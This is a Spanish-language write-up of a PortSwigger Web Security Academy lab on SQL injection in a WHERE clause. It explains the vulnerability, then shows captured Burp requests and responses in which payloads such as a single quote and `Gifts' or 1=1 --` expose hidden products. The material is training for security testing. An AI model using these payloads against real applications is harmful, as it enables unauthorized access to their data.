# 💉 Laboratorio:Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de dato

**inyección SQL**La inyección SQL es una vulnerabilidad clásica responsable de muchas violaciones de datos de alto perfil. Permite a un atacante interferir con las consultas que la aplicación envía a su base de datos, lo que podría devolver datos confidenciales de tablas arbitrarias dentro de la base de datos.

### ¿Qué es la inyección SQL (SQLi)?

La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que realiza una aplicación a su base de datos. Esto puede permitir que un atacante vea datos que normalmente no puede recuperar. Esto podría incluir datos que pertenecen a otros usuarios o cualquier otro dato al que pueda acceder la aplicación. En muchos casos, un atacante puede modificar o eliminar estos datos, provocando cambios persistentes en el contenido o el comportamiento de la aplicación.

En algunas situaciones, un atacante puede escalar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end. También puede permitirles realizar ataques de denegación de servicio.

### Cómo detectar vulnerabilidades de inyección SQL

Puede detectar la inyección de SQL manualmente utilizando un conjunto sistemático de pruebas en cada punto de entrada de la aplicación. Para hacer esto, normalmente enviarías:

* El carácter de comilla simple `'`y busca errores u otras anomalías.
* Alguna sintaxis específica de SQL que evalúa el valor base (original) del punto de entrada y un valor diferente, y busca diferencias sistemáticas en las respuestas de la aplicación.
* Condiciones booleanas como `OR 1=1`y `OR 1=2`y busque diferencias en las respuestas de la aplicación.
* Cargas útiles diseñadas para desencadenar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL y buscar diferencias en el tiempo necesario para responder.
* Cargas útiles de OAST diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecuta dentro de una consulta SQL y monitorear cualquier interacción resultante.

Alternativamente, puede encontrar la mayoría de las vulnerabilidades de inyección SQL de forma rápida y confiable utilizando Burp Scanner.

### Recuperar datos ocultos

Imagine una aplicación de compras que muestra productos en diferentes categorías. Cuando el usuario hace clic en la categoría **Regalos** , su navegador solicita la URL:

`https://insecure-website.com/products?category=Gifts`

Esto hace que la aplicación realice una consulta SQL para recuperar detalles de los productos relevantes de la base de datos:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Esta consulta SQL solicita a la base de datos que devuelva:

* Todos los detalles ( `*`)
* de la `products`mesa
* donde `category`esta`Gifts`
* y `released`es `1`.

La restricción `released = 1`se utiliza para ocultar productos que no se comercializan. Podríamos suponer que para productos inéditos, `released = 0`

### Recuperar datos ocultos - Continuación

La aplicación no implementa ninguna defensa contra ataques de inyección SQL. Esto significa que un atacante puede construir el siguiente ataque, por ejemplo:

`https://insecure-website.com/products?category=Gifts'--`

Esto da como resultado la consulta SQL:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

Fundamentalmente, tenga en cuenta que `--`es un indicador de comentario en SQL. Esto significa que el resto de la consulta se interpreta como un comentario, eliminándolo efectivamente. En este ejemplo, esto significa que la consulta ya no incluye `AND released = 1`. Como resultado, se muestran todos los productos, incluidos aquellos que aún no se han lanzado.

Puedes utilizar un ataque similar para hacer que la aplicación muestre todos los productos en cualquier categoría, incluidas las categorías que no conocen:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

Esto da como resultado la consulta SQL:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

La consulta modificada devuelve todos los elementos donde es `category`o `Gifts`es `1`igual a `1`. Como `1=1`siempre ocurre, la consulta devuelve todos los elementos.

**Advertencia**

Tenga cuidado al inyectar la condición `OR 1=1`en una consulta SQL. Incluso si parece inofensivo en el contexto en el que se está inyectando, es común que las aplicaciones utilicen datos de una única solicitud en varias consultas diferentes. Si su condición llega a una declaración `UPDATE`o `DELETE`, por ejemplo, puede resultar en una pérdida accidental de datos.

### Laboratorio: Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de datos ocultos

APRENDIZ

LABORATORIONo resuelto

Esta práctica de laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Cuando el usuario selecciona una categoría, la aplicación realiza una consulta SQL como la siguiente:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Para resolver la práctica de laboratorio, realice un ataque de inyección SQL que haga que la aplicación muestre uno o más productos inéditos.

```python
// Some code

Laboratorio:Vulnerabilidad de inyección SQL en la cláusula WHERE que permite la recuperación de dato






ANALIZANDO LA PAGINA WEB Y SU URL AL SOLICITAR UNA CATEGORIA Y VEMOS COMO TRABAJA MANUALMENTE:



https://0ae300cc036d57f980502b3a008e0087.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories


https://0ae300cc036d57f980502b3a008e0087.web-security-academy.net/filter?category=Corporate+gifts










AHORA VAMOS A CAPTURAR CON BURPSUITE NUESTRA REQUEST A ALA HORA DE ELEGIR UNA CATEGORIA PARA VER COMO LA SOLICITA AL SERVIDOR, TY TRABAAJR CON ELLA LUGO:




REQUEST ORIGINAL:






GET /filter?category=Gifts HTTP/2
Host: 0ae300cc036d57f980502b3a008e0087.web-security-academy.net
Cookie: session=toC1WozGOYlYgdFOPwgpXdZqsH5nzOmt
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae300cc036d57f980502b3a008e0087.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close






RESPONSE ORIGINAL:






HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4826

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Gifts</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category selected" href="/filter?category=Gifts">Gifts</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $8.88
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $35.43
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>







PROBAMOS INJECTANDO UNA COMILLA '  :





REQUEST:



GET /filter?category=' HTTP/2
Host: 0ae300cc036d57f980502b3a008e0087.web-security-academy.net
Cookie: session=toC1WozGOYlYgdFOPwgpXdZqsH5nzOmt
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae300cc036d57f980502b3a008e0087.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8








RESPONSE INTERNAL ERRRO CODE 500:





HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2388

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title>
    </head>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>Internal Server Error</p>
                </div>
            </section>
        </div>
    </body>
</html>











PROBAMOS AHORA CON LA INYECCION CLASICA PARA TRAATAR DE VER TODAS LAS CATEGORIAS Gifts' or 1=1 -- :





REQUEST:




GET /filter?category=Gifts' or 1=1 -- HTTP/2
Host: 0ae300cc036d57f980502b3a008e0087.web-security-academy.net
Cookie: session=toC1WozGOYlYgdFOPwgpXdZqsH5nzOmt
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae300cc036d57f980502b3a008e0087.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8










RESPONSE SE TENZO MOSTRO INCLUYENDO TODAS LAS CATEGORIA:




HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11549

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Gifts&apos; or 1=1 --</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating3.png">
                            $25.71
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating1.png">
                            $81.53
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating3.png">
                            $38.17
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/60.jpg">
                            <h3>Dancing In The Dark</h3>
                            <img src="/resources/images/rating3.png">
                            $10.73
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $99.96
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating4.png">
                            $9.53
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/50.jpg">
                            <h3>The Bucket of Doom</h3>
                            <img src="/resources/images/rating4.png">
                            $65.99
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating2.png">
                            $33.84
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/43.jpg">
                            <h3>First Impression Costumes</h3>
                            <img src="/resources/images/rating5.png">
                            $0.58
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/28.jpg">
                            <h3>Vintage Neck Defender</h3>
                            <img src="/resources/images/rating2.png">
                            $59.53
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating5.png">
                            $43.47
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating3.png">
                            $8.88
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $35.43
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating5.png">
                            $97.79
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating1.png">
                            $55.94
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/49.jpg">
                            <h3>Roulette Drinking Game</h3>
                            <img src="/resources/images/rating5.png">
                            $99.22
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/55.jpg">
                            <h3>WTF? - The adult party game</h3>
                            <img src="/resources/images/rating1.png">
                            $3.55
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $91.93
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating3.png">
                            $11.87
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```







